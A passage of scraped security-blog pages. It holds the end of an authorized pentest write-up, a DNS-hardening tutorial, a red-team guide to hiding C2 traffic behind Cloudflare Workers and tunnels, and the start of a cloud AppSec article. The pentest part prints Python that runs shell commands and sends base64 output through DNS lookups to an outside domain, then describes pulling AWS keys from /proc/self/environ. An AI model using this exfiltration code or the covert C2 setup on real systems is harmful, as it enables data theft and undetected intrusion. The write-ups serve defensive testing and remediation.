in b64 encoding.\ndata = popen('uname -r').read().encode('UTF-8') payload = b64encode(data).decode('utf-8').replace('=','') url = f'http://{payload}..subdomain.awesome-blogpost.com' lookup = gethostbyname(url) On Interactsh, we should get back the encoded output:\n[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.\u003cuuid\u003e.subdomain.awesome-blogpost.com.] received DNS interaction from 35.... Using the base64 cli utility, we would then get back the command output for uname -r\n$ echo -n 'NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK' | base64 -d 5.10.216-225.855.amzn2.x86_64 pic7 Chunks \u0026 Ordering When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender’s message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!\nNow that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.\nBelow is how I implemented it (with a little bit of help from our friend ChatGPT…) - if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out 60*(n) to 60*(n+1) th bytes, and finally add the index label before the payload in the final DNS query:\ndata = popen('ls /usr/bin').read().encode('UTF-8') payload = b64encode(data).decode('utf-8').replace('=','') if len(payload) % 60 == 0: num_segments = 0 else: num_segments = (len(payload) // 60) + 1 for i in range(num_segments): start_index = i * 60 end_index = start_index + 60 segment = payload[start_index:end_index] url = f'{i}.{segment}..subdomain.awesome-blogpost.com' And the glorious moment of seeing the results back:\n_ __ __ __ (_)___ / /____ _________ ______/ /______/ /_ / / __ \\/ __/ _ \\/ ___/ __ '/ ___/ __/ ___/ __ \\ / / / / / /_/ __/ / / /_/ / /__/ /_(__ ) / / / /_/_/ /_/\\__/\\___/_/ \\__,_/\\___/\\__/____/_/ /_/ projectdiscovery.io [INF] Listing 1 payload for OOB Testing [INF] .subdomain.awesome-blogpost.com [0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ... [1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ... [2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ... [3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ... [4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ... [5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ... ... Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:\n$ xclip -o clip | cut -d ' ' -f 1 | sed 's/\\[//;s/\\.\\]//' | sort -h | uniq \u003e output26; python3 decode2.py output26 Decoded string: alias arch awk ... ls md5sum microdnf mkdir ... Look at me, I am the Lambda now Now we are cooking! That’s basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app’s feature, get back results from Interactsh, and decode in Python. I’ll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to Hacktricks’ articles on this. Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret \u0026 access keys of the application. With AWS credentials you can impersonate the application’s identity and access (supposedly) whatever the app could access inside of the AWS tenant.\nThis was the first method I demonstrated, showing how the “AWS_ACCESS_KEY_ID” was extracted with os.envrion.\npic14 The second method, reading the environmental vars from /proc/self/environ:\npic15 To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your ~/.aws/credentials file like this:\npic16 Running sts get-caller-identity, the whoami for aws cli, we can see that the authentication as the lambda was successful.\npic17 Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda’s identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn’t much. There were some other attack vectors pertaining the Lambda angle, such as the /invocation/next endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.\npic18 Epilogue - Investigations on AWS Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly “blocked everything”. In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an “air gapped” cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).\nAfter delivering the report I couldn’t stop thinking about this remediation bit because:\nI thought it should be possible to configure that capacity, but I’m not 100% sure how to. So if I deployed a Lambda myself, I wasn’t sure yet how it should be secured against this attack (besides not having an RCE, phew!).\nOr … what if there wasn’t an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?\nSo the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?\nI searched around for a bit for strings like “DNS Firewall” within AWS and on Google. Soon I found this: “Route 53 Resolver DNS Firewall”, a billable service … that blocks port 53 after you have blocked port 53. I was like “of course Jeff, I knew you’d do this to us…”.\npic17 To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.\npic17 After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it’s all done! The Lambda was no longer querying random DNS servers for arbitrary domains.\nI hope you’ve enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you’d see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.\nThe client definitely found it a very cool story during our debrief and allowed me to publish it, so although we’re not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end."},"title":"What’s in a Name? Writing custom DNS tunnelling protocol, exploiting unexpected AWS Lambda misconfiguration – in a web app Pen test (Part 2)"},"/articles/2024/06/2024-06-19-bullet-proofing-your-email-gateway/":{"data":{"":"","#":"In this labs post, I will introduce you to modern security controls that are currently used (but not always correctly) by the vast majority of enterprises, and hopefully by the end of this write-up, the topic will become a little clearer and the concepts will become easier to grasp.\nIn today’s world of spammers, intruders, and fake emails, having a robust setup for your email deliveries is crucial. Email security is a constant challenge, with businesses and individuals facing an increasing number of virus-infected emails and phishing scams daily. Protecting systems and sensitive data requires vigilance and continuous effort.\nAccording to Zscaler’s latest annual phishing report, the past year saw a 58% increase in phishing attacks (https://www.zscaler.com/blogs/security-research/phishing-attacks-rise-58-year-ai-threatlabz-2024-phishing-report). This rise highlights the growing need for effective email security measures to ensure that malicious emails do not end up in our corporate or personal inboxes.\nA significant advancement is the availability of enhanced security options designed to shield us from harmful emails. These innovative methods significantly enhance the safety of email interactions. What’s more, these improved security measures are effective regardless of whether you’re sending or receiving emails. By adopting these new approaches, we can substantially minimise the risks associated with email-related threats, thereby fostering a safer experience for all parties involved.\nSender Policy Framework (SPF) It’s an email authentication protocol designed to assist mail servers in identifying and thwarting spam, phishing, and spoofing attempts. This mechanism relies on DNS records to publish a roster of authorised mail servers and validate the origins of emails.\n+-------------------------+ | Mail Sender's Domain | | (e.g., example.com) | +-------------------------+ | | Sends Email v +-------------------------+ | Recipient's Mail Server | +-------------------------+ | | Queries DNS for SPF Record v +-------------------------+ | DNS Server | +-------------------------+ | | Returns SPF Record v +-------------------------+ | Recipient's Mail Server | +-------------------------+ | +---------------------------------------+ | | Compares IP Address Action Based on with SPF Record SPF Verification | | | | v v +--------------+ +----------------+ | Match Found | | No Match Found | +--------------+ +----------------+ | | v v Accepts Email Rejects/Quarantines/ Marks Email as Spam Here’s how it works: When an email is dispatched from domain A, the mail server of domain B scrutinises domain A’s SPF record. If no SPF record is found for domain A, it signifies that the mail server isn’t an authorised sender. Consequently, the email fails the SPF check and is either flagged as spam or rejected outright.\n1 In the provided example, the SPF record includes the version of SPF being utilised and lists Outlook mail servers. Additionally, it employs the “-all” flag, indicating a strict policy where any mail server not explicitly listed in the SPF record will fail the check. Conversely, “~all” signifies a softer policy where failures are treated less strictly.\nOne limitation of SPF is its restricted scope of protection. It solely verifies the sender’s IP address against the domain’s SPF record, leaving a vulnerability against spoofing of the From: email header, a common tactic used to deceive recipients.\nDomain Keys Identified Mail (DKIM) This email authentication protocol is designed to detect forged sender addresses by enabling receivers to verify if an email is legitimately sent from a specified domain. It introduces a unique domain name identifier to emails, distinct from other identifiers, and secures it through encryption using public and private keys. The public key is shared as part of the DNS record to verify the email signature and is stored on the sender’s email server, while the private key resides on the sender’s computer and is used to generate a unique digital signature for each outgoing email. This signature, essentially a hash value derived from the email’s content and headers, is encrypted with the private key and included in the email header.\nDKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; h=from:to:subject:date:message-id; bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=; b=abc123... The DKIM header provides essential information including the DKIM version being utilized, the signing algorithm employed, the domain of the entity that signed the email, the selector used to locate the public key in DNS, and a list of headers included in the signature, along with the body hash and signature data.\nIn essence, DKIM serves to verify that the email content has not been tampered with during transit and that it originates from an authorised mail server for the specified domain.\nDomain-Based Message Authentication Reporting and Conformance (DMARC) This mechanism serves as an authentication layer, providing an additional level of security beyond SPF and DKIM. It introduces an extra policy alignment layer and reporting mechanism.\nThe policy enables specification of how to handle emails that fail SPF and DKIM checks—options include none, quarantine, or reject. When both SPF and DKIM checks pass, it confirms the legitimacy of the email, verifying that it originates from an approved server and that header information remains unaltered. For SPF alignment, the domains specified in the From: header and Return-Path must match.\nFor DKIM, the domains specified in the From: and d= fields must align.\nv=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com; ruf=mailto:dmarc-forensics@example.com; fo=1; adkim=s; aspf=s; Above is the example DMARC record can be found as TXT record in DNS of a domain.\nv= specifies DMARC version p= specifies policy that handles emails that are failing authentication (either none, quarantine, or reject) rua= is an address to send aggregate reports ruf= address to send forensic reports fo=1 specifies format of forensic reports adkim=s specifies alignment mode for DKIM (where s = strict and r = relaxed), aspf=s specifies alignment mode for SPF (s = strict and r=relaxed)\nConfiguring DMARC can be challenging, but there is a valuable resource available at https://dmarc.org/2016/07/common-problems-with-dmarc-records/ that comprehensively addresses common issues encountered during the implementation of this protocol.\nBolstering Email Security - O365 example By default, in our Microsoft 365 tenants, the SPF record is automatically configured during tenant creation, alleviating concerns about it for the time being. Our focus now shifts to setting up the DKIM record, especially in scenarios where we manage our own domain DNS. To verify the SPF record, you can use the following command:\n❯ dig acmeldn.onmicrosoft.com txt\n;; ANSWER SECTION: acmeldn.onmicrosoft.com. 3508 IN TXT \"v=spf1 include:spf.protection.outlook.com -all\" To set up DKIM, we first need to check for our domainGUID. This can be done by using the dig command to check for the existing domainGUID.\n❯ dig acmeldn.onmicrosoft.com mx\n;; ANSWER SECTION: acmeldn.onmicrosoft.com. 3508 IN TXT \"v=spf1 include:spf.protection.outlook.com -all\" Next, we visit the Microsoft Admin Center at https://admin.microsoft.com/AdminPortal/Home#/Domains, where we navigate to the DNS records tab to add records. The DomainGUID is specified just before “mail.protection.outlook.com”. With this information, we can now manually add CNAME records to our DNS. The records will look like this:\nHostname: selector1._domainkey Value: selector1-acmeldn._domainkey.acmeldn.onmicrosoft.com TTL: 3600Hostname: selector2._domainkey Value: selector2-acmeldn._domainkey.acmeldn.onmicrosoft.com TTL: 3600 3 Next, we can enable DKIM in the Microsoft Defender Security Dashboard (https://security.microsoft.com/authentication?viewid=DKIM).\n2 Et Voila! With our SPF and DKIM records set up and ready for our outgoing email stream, we can now proceed to enable DMARC. DMARC helps us verify unauthenticated usage of our domain email and ensures validation of the From email field. To accomplish this, we can publish the following TXT record in the Microsoft 365 admin center at https://admin.microsoft.com/AdminPortal/Home#/Domains.\nName: _dmarc Value: v=DMARC1; p=none; pct=100; rua=mailto:rua@acmeldn.onmicrosoft.com; ruf=mailto:ruf@acmeldn.onmicrosoft.com TTL: 3600 4 In order to verify our configuration, we can use https://dmarcian.com/dmarc-inspector/\n5 Endnote \u0026 Next steps Once SPF, DKIM, and DMARC have been successfully implemented, it’s crucial to monitor SMTP logs. By carefully investigating these logs, we can pinpoint the reasons why emails are being blocked. Additionally, aggregate and forensic reports provide valuable insights into the numbers and sources of messages that pass or fail the checks.\nThe next step involves increasing the DMARC policy to p=quarantine and monitor the emails. Gradually increasing the pct= value allows us to verify the fail/pass rate. After some time, we can further enhance security by changing the policy top=reject. Again, gradual increases in the pct= rate enable us to monitor for any false positives or email anomalies, leveraging DMARC logs and inspectors mentioned above.\nIn short:\nAdd the DMARC record v=DMARC1; p=none; pct=100; rua=mailto:rua@example.com; ruf=mailto:ruf@example.com After some time - enable quarantine within the policy v=DMARC1; p=quarantine; pct=100; rua=mailto:rua@example.com; ruf=mailto:ruf@example.com Gradually change the pct= value from 10-100 After some time - change policy to reject v=DMARC1; p=reject; pct=100; rua=mailto:rua@example.com; ruf=mailto:ruf@example.com Gradually change the pct= value from 10-100 Test and verify for email deliveries and if legitimate email is rejected by repeating the steps above. References: https://learn.microsoft.com/en-us/defender-office-365/email-authentication-about https://www.esecurityplanet.com/networks/how-to-set-up-and-implement-dmarc-email-security/ "},"title":"Bullet Proofing Your Email Gateway"},"/articles/2024/06/2024-06-28-putting-the-c2-in-c2loudflare/":{"data":{"":" tl;dr How to bring up an entire C2 infrastructure with all your tooling and their corresponding redirectors within 5 minutes with the help of Azure Snapshots, Cloudflare and Tmux Resurrect.\nEvery so often I seem to stumble across various ideas, that when combined, massively improve my overall productivity at work. Most of these ideas on their own are nothing new, but when used in tandem can really accelerate your productivity, which is what I wanted to illustrate in today’s post. A great example of this is combining Cloudflare workers, apps and tunnels along with Azure VM snapshots and Tmux Resurrect to allow you to bring up an entire C2 infrastructure in 5 mins from a single VM.\nHere at JUMPSEC we have now moved from a system where we would need to allocate project time for infrastructure setup, to it only being something we need to allocate 5 minutes to on day 1 of the test in some cases. Just to help you understand the efficiencies that can be gained with this setup, and how it is worth your investment to continue reading, here is our typical “Day 1” infrastructure setup workflow utilising both Azure and Cloudflare:\nCreate a Disk in Azure from our saved ‘Template’ snapshot (2 mins) Create a VM from that Disk (2 mins) Log into the VM and using the tmux-resurrect plugin all of our servers can be brought up at a keystroke (1 min) That’s it, 5 mins of your time. Our previously saved snapshot is a VM saved in time with no client data but containing all of our tools including multiple C2 servers, Ligolo server, http server, Tmux Resurrect, prebuilt payloads for that redirector url and, of course, the Cloudflare connectivity we will focus on in this blog.\nIn regards to Tmux Resurrect, think of it as a tool where if you have 6 command prompt panes open in a single tmux session, each with their own C2 server or Cloudflare connectivity command running, that it allows you to save that view. The next time you start tmux and issue the ‘Ctrl-r’ command it ‘resurrects’ that view so it will kick off all the commands that were running previously when you saved them, therefore starting all of your servers instantly. This can be a great time saver.\nCreating snapshots, disks and VM’s from those disks is also super easy following the guidance here. After you are happy that the template VM has all of your servers operating correctly, with Tmux Resurrect configured to start them, you can just snapshot it. Obviously you can then have multiple snapshot templates connecting to different Cloudflare redirectors to scale this up amongst your team so testers aren’t all using the same Cloudflare Worker.\nFrom here on in we will focus on the Cloudflare configuration side of things as that is the trickier aspect and the main point of this post. Given this process is meant to simplify life, this post will be more screenshot heavy than textual but I think that’s what people prefer (or at least I hope) in regards to this type of post. What we are fundamentally trying to achieve can be seen in this diagram below, where we can point our tooling whether it be Ligolo, C2 agent or file requests at a single redirector hostname where a Cloudflare Worker will consume the request and redirect it to the desired location on our Cloud VM.\nimage9 Anyway, let’s make a start.\nTo begin with, it is worth noting two points. Firstly, the naming conventions used for headers, domains, tunnel names, etc. are all for illustrative purposes so we have made them as obvious as possible, but do adjust them to suit your own needs.\nSecondly I am taking it for granted that creating a VM in Azure or AWS and being able to SSH into it as well as buying a domain from Cloudflare or transferring one to Cloudflare is something that our readers can manage. Therefore, I will focus on explaining the remainder of the infrastructure in the diagram.\nExcept for buying a domain name, the cost of the Cloudflare setup is entirely cost free which is an amazing facility to have although you will need to register a credit card on your account. It’s also worth noting that a lot of this setup is one-time only, so if it looks like a scary amount of config, rest reassured at this point that the majority of it is a one-off.\nFirst things first, you will need to set up a Cloudflare account, so go on over to Cloudflare.com and register an account. If you bought your domain from them or have recently transferred it to them, you will see your domain listed under ‘Websites’ as shown. Please note the highlighted ‘Zero Trust’ area too because that is where we will head to next.\nimage11 On clicking your domain, you will have visibility of an important piece of information which is your ‘Account ID’. Please note this down as this will be required further on.\nimage10 Now follow the previously highlighted link to the ‘Zero Trust’ area of Cloudflare which is where we will add our various tunnels from the outside world into our cloud virtual machine.\nOn entering the ‘Zero Trust’ section choose ‘Networks’ followed by ‘Tunnels’ and click ‘Create a tunnel’ which will create an area where you can create multiple tunnels within it.\nimage13 At this point you will be asked to create your first tunnel or “Public hostname”. Pictured below are some of the ones we use (which are redacted) but just to give you an idea the first ‘Public hostname’ could be https://sliver.yourDomain.com and any Sliver C2 data hitting that endpoint would then be routed through that particular tunnel into the VM where ‘cloudflared’ is running and it will be redirected to the Sliver listener at https://127.0.0.1:443.\nimage12 Just one thing to point out, when you see the number 1 under ‘Origin configurations’ it is just highlighting that some additional config is in place and for the https tunnels that was simply just toggling ‘No TLS Verify’ to ‘Enabled’ to ensure that the data bypasses any TLS checks:\nimage15 Now in the ‘Overview’ area of your Cloudflare tunnels you will be provided with some code that needs to be run on your Cloud VM which will start the tunnels calling out to Cloudflare to allow traffic to traverse them. This includes your very long private token. So, click your OS of choice and using their instructions install the Cloudflare tunnel software which they call ‘cloudflared’ on your VM.\nimage14 To then start the tunnels on your VM you run this command:\ncloudflared tunnel run --token YourTokenHere\nRight, just taking us back to our overview diagram to view our progress, we have now completed the area in red, so we are halfway there. Good job.\nimage17 As it stands you can now send data into your tunnels quite easily, the problem is, that so can anyone else. As covert red teams that is not a good look, so we need to add some protection to the tunnels. This is where the workhorse of the setup comes into play via the Cloudflare worker.\nThe Cloudflare worker comes with its own Cloudflare URL, normally something like customworkername.customsubdomain.workers.dev but it can also be a domain of your choosing. We have kept it as the well-known Cloudflare workers.dev prefix for demonstration purposes. The worker is essentially serverless code, which is constantly receiving requests and, in our case, redirecting those requests to where we want them to go.\nTo create our worker some tools are required, and some code needs to be deployed but this doesn’t necessarily need to be carried out on your cloud VM and can be carried out from your local Linux system that has access to your Cloudflare account.\nFirstly, if you don’t have it installed, install the npm package like so which provides access to the npx command:\nsudo apt install npm\nFollowing this, checkout out the demo Cloudflare worker we have provided on our Github repo that will contain a ‘src’ folder which has an index.js file (which is the code the Worker uses to run) and it will also contain a wrangler.toml file which contains the variables the Worker references:\nhttps://github.com/JumpsecLabs/CloudflareRedirector\nNow cd into the ‘CloudflareRedirector folder and run this command to install the wrangler files required to deploy the worker to Cloudflare.\nnpm install wrangler --save-dev\nA folder named node_modules and a file named package.json will also be created within our folder but we don’t need to be concerned with those.\nNext, we need to authenticate to the Cloudflare account we set up previously so issue this command and log into Cloudflare:\nnpx wrangler login\nFinally open the wrangler.toml file in your text editor of choice and edit the fields outlined in red below including your accountid that we found at the beginning of this post. The URLs should match the tunnel URLs you have previously set up. The worker endpoint, customip, service variables, etc. can be readjusted after it has been deployed so you can leave them as-is.\nThe wrangler.toml file that provides variables to be used by the Cloudflare worker can be seen here. As mentioned the verbose subdomains and headers are used for demo purposes so adjust accordingly.\nimage16 With all of this data populated we can now deploy the Worker to Cloudflare with:\nnpx wrangler deploy\nNow when we go back to Cloudflare and go to the ‘Workers \u0026 Pages’ section we should see our new Worker named ‘redirector’ as shown:\nimage20 When you go to the ‘Settings’ tab of the worker and view the variables you can see whatever data you have just deployed across to Cloudflare. You can edit these in the gui as shown, although another deployment will overwrite these, so if many deployments are expected you are better off making the changes in the wrangler.toml file and redeploying.\nimage18 You can also click ‘Edit Code’ which will display the code used by the worker which is essentially the index.js file from the src folder we checked out from the repo. Below is just a snippet of the beginning of that file:\nimage19 At this point it’s probably worth taking some time to explain how the worker code that we deployed operates. Essentially, we specify some constants at the beginning which we will use to look for header data within the incoming http requests. We also specify our custom constants to store the values we manually entered via our wrangler.toml such as SLIVER_HEADER which had the value MY-SLIVER.\nNow when a request comes in, the worker checks via multiple ‘if’ statements if the incoming header value is equal to for example the ‘SLIVER_HEADER_’_ text of ‘MY-SLIVER_’._ If it matches, we create a new request and send it to the sliverUrl which is linked to our custom SLIVERENDPOINT which should be linked to the URL of the Sliver tunnel.\nThe code continues on like this with other ‘if’ checks, such as this one below redirecting our requests to our file server. In the scenario that the http request doesn’t have a custom header that we are expecting the code then checks if the IP is an IP we may want to allow into our internal file server. We then redirect that to a tunnel which points to our internal http server. This IP can be set under CUSTOM_IP in the wrangler.toml or via the Cloudflare website.\nimage4 So, in our case we may have a custom header for multiple C2’s running on our VM or a Ligolo server. Keep in mind though, to use Ligolo over Cloudflare websockets you will need this fork of ligolo-ng:\nhttps://github.com/virusvfv/ligolo-ng/tree/Websockets\nAnyhow, you may also have noticed that two new header values (‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’) are also added to the new request via the code but I will come to that in a moment.\nNow that your worker is deployed you can view its URL in the ‘Triggers’ area of the Worker’s ‘Settings’ area as shown below. Here you can set a custom domain or take the one provided by Cloudflare.\nimage21 When you have decided which URL to use please go back and edit the variable ‘WORKER_ENDPOINT’ in your wrangler.toml and redeploy it or via the Cloudflare gui which will automatically redeploy the worker.\nIt’s also worth pointing out the logging features of the redirector should there be any issues with the requests coming in. You can click ‘Begin log stream’ under ‘Logs’ which will allow you to see all the requests entering the worker. There is also logging on the tunnels should you want to see the requests entering those too. We feel that some of the drawbacks in regards to lack of visibility for debugging that previously existed in regards Cloudflare or other domain fronted setups have now been mitigated with all of these excellent logging capabilities.\nimage22 Just taking another step back, this is how far we have come now with only the final piece of the jigsaw in red left to complete.\nimage23 We now have a Worker that can receive custom http requests and we have tunnels that will take the requests and tunnel them into our Cloud VM infrastructure. The last issue we have is that although we now have a Worker carrying data to our tunnels, the tunnel URLs are still accessible to the outside world so our Worker can be bypassed.\nTo rectify this, we need to add a ‘Zero Trust’ check to the tunnel ‘entrances’, and we do this by placing Cloudflare applications as the entry point to them. These can also have preconditions to entry attached to them called ‘Policies’. This is easier to explain with some further screenshots.\nWe must first create a ‘Service token’ which is used by automated systems like Workers to authenticate against our zero trust policies. In the Cloudflare zero trust area we go to ‘Access’ then ‘Service Auth’ and click ‘Create Service Token’ and provide a name and duration.\nimage24 This will generate us a token that can be used by your Worker to access the ‘Zero Trust’ area where our tunnels are located. The token will only be visible at this point so please note down both the ‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’ fields and populate them in your wrangler.toml file and redeploy that or manually add them into the variables area of your Worker.\nimage25 Now our Worker has the ability to use a token to enter Cloudflare’s zero trust tunnels, but we still need to add the checks for this token ID on the tunnels themselves.\nTo do this we create 3 apps pointing to our 3 tunnel URLs as follows. Click ‘Add an application’ and choose ‘Self-hosted’:\nimage26 Choose a name and the tunnel the app is meant to be linked to. So, if your tunnel is sliver.mydomain.com add those details in the redacted areas below.\nimage27 Next up we choose what Policies will be used to allow or deny data into the tunnel via the application. Here we choose our Service-Auth access we set up previously so only requests that have those two header values of ‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’ will be allowed access i.e. only data via our clever Worker which now adds those two headers automatically can enter. An easy mistake to make here is to not choose ‘Service Auth’ under the ‘Action’ dropdown so make sure that is chosen.\nimage1 The Policy’s remaining settings can remain as they are when you are creating Policies for Ligolo or for a C2 so create two apps exactly as per above if only using a C2 and Ligolo. For access to files, it is useful to add a second bypass policy and I will explain why now.\nIf you create another app called ‘Files’ to allow access into your remote file server, we can restrict requests entering from only a specific IP, but we can also allow privileged users directly into the files tunnel who have a specific email address outside of that IP. This is for the occasions when a team may want to access their remote VM files but don’t want to keep adding multiple custom IPs to the Worker or don’t need command line access via wget, certutil etc.\nimage2 To do this add another policy called ‘Email’ and add an ‘Include’ email selector at the bottom and enter a specific email address or if you are working in a team you may want to allow all email addresses that end in mycompany.com for example.\nimage3 What happens then is, when you visit the files tunnel URL directly (https://files.yourdomain.com) therefore bypassing the IP checks of the Worker redirector you can still access it and you will be presented with this webpage as shown:\nimage5 You can then enter your email address of john.doe@mycompany.com and if the email is valid as per the Policy, you will be emailed a code to get access through the tunnel.\nimage6 You can then access your files like this via the browser for example which is quite useful.\nimage7 At the end of this config process, you should now have a bunch of applications pointing to your tunnels as shown, kinda acting like gatekeepers to them via Policies, hence the zero-trust aspect:\nimage8 So, if you are still with me that is now all we need to access our cloud infrastructure via Cloudflare. Just to summarise, this is now how it all becomes operational:\nWe update Cloudflare as I have shown to expect our custom header values. We update Cloudflare to expect a custom IP should we want to grab files from a specific IP. We can generate a C2\\Ligolo agent with a custom header. Therefore, with the branched websockets version of Ligolo-ng as an example you can do the following:ligolosockets.exe -connect https://redirector.myname.workers.dev:443 -ua MY-LIGOLO We send all of our requests to the Worker redirector URL and not to the tunnels directly as the Worker will add the zero trust header values required to enter the tunnels. Accessing them directly will no longer work except for the email login to our file server. The worker passes the request to the app sitting in front of the tunnels which then checks for the service auth token to make sure it matches. If the service auth token matches, the request is directed to that specific tunnel. This then flows into the internal URL of our Cloud VM (which is specified in the tunnel config) to provide us with our connectivity. The above Cloudflare configuration coupled with Azure snapshots and Tmux Resurrect make for a really nice combination in regards swiftly bringing up your red team infrastructure. We hope that you found this useful, and we feel that it is worth trying this setup out for yourself and your team if you want to speed up your infrastructure creation."},"title":"Putting the C2 in C2loudflare"},"/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/":{"data":{"":"","aws#\u003cstrong\u003eAWS\u003c/strong\u003e":"","azure#\u003cstrong\u003eAzure\u003c/strong\u003e":"","cloud-hosted#\u003cstrong\u003eCloud-Hosted\u003c/strong\u003e":"","cloud-permissions#\u003cstrong\u003eCloud Permissions\u003c/strong\u003e":"","conclusion#\u003cstrong\u003eConclusion\u003c/strong\u003e":"Introduction I’ve recently spoken at several conferences about the changes that are underway within red teaming as a result of cloud migration. My team and I have been delivering majority cloud red team work over the last year and the differences are becoming more apparent by the day. One point I’ve mentioned as ‘controversial’ at several of these events is that cloud migration has actually made AppSec more important than ever. I went some way to trying to explain why I think this is during my talks, but it was something that I felt deserved its own blog post to explore in more detail, with clear examples of how compromise of an on-prem application can look different to a cloud-hosted one.\nDisclaimer AppSec is a huge domain and one that I will not try to pretend I am currently in a position to speak with authority on as I’ve been focused almost entirely on red teaming over the last few years. Whilst I was an application pentester many moons ago I will be discussing this topic from the perspective of a red teamer / threat actor looking to achieve notable impact from the compromise of an application, namely initial access into an organisation. The Traditional Approach So, before jumping into the cloud-hosted application side of things, let’s briefly discuss the ‘traditional’ approach with which I will be comparing it to. Whilst there are countless ways of hosting a web application, let’s simplify it with a common setup looking something like the below image. image8 Reference: https://www.wallarm.com/what/what-is-a-dmz In the above image we can see that the application is being hosted in the ‘demilitarised zone’ or DMZ as would be typical of an on-premise application. This means that the application is effectively firewalled off from the public internet and enterprise (I usually use the term ‘corporate’) networks except for connections that are strictly necessary. Overall, the intention here is to limit the potential impact that could come from compromising said application, crucially preventing it from having unfettered access into the corporate network. This makes sense, as many applications hosted as such are internet-facing and therefore face a considerable risk of compromise. In traditional setups, you also have a few common additional layers of security to bypass if you wanted to truly weaponise an application you had compromised. Firstly, you will often be using a dedicated ‘service account’ to run the web server. This account is often only used for running this one web server, and as such has next-to-no permissions to do or access anything else. Finally, you may also find that your exploit (for example a malicious file upload vulnerability) lands in what is called the ‘web root’. This is the directory on the web server in which you store all the contents used for hosting the web server such as config files, images, etc. In these scenarios you may find that the service account you have now compromised cannot even explore the web server’s file system, and instead is strictly limited to the web root. When you add all of this up, you may find instances where your super awesome remote code execution vulnerability actually has very limited impact in terms of progressing an attack path towards the internal estate and / or critical assets. This exact scenario happened to me on a purple team engagement last year, in which I exploited a vulnerability to get remote code execution on a web server, only to find that it was firewalled off from the corporate network, restricted to the web root, was not domain-joined, and my account had very little permissions. Ultimately this meant that its ‘usefulness’ to me was limited. In fact, one interesting tidbit about that story is that by listing the contents of the web root by ‘time modified’ I was able to discern that several genuine threat actors had also compromised that web server the same way within the last 5 days or so. Naturally this kicked off an IR engagement, which ultimately discovered that the threat actors, like myself, had found limited impact from the compromise of the web server so had installed crypto miners and called it a day. A full write up of this story was posted last year and can be found here.\nCloud-Hosted So, how do things change when we are discussing a cloud-hosted web application? Well, let me start by saying that achieving the same level of defence in depth is certainly possible with a cloud-hosted web application. However, it is our experience that, just like we see overly permissive IAM roles and abusable default settings in every cloud environment we work in, this is rarely as well locked down when it comes to the far less understood world of cloud. Additionally, beyond the access control and ‘identities’ belonging to these cloud-hosted applications generally not undergoing the same level of scrutiny as on-premise (partly due to ‘least privilege access’ being a mire in the complex world of cloud permissions) we are also able to leverage a nice feature that all cloud providers have implemented in different ways, called the Metadata Service. image10 To 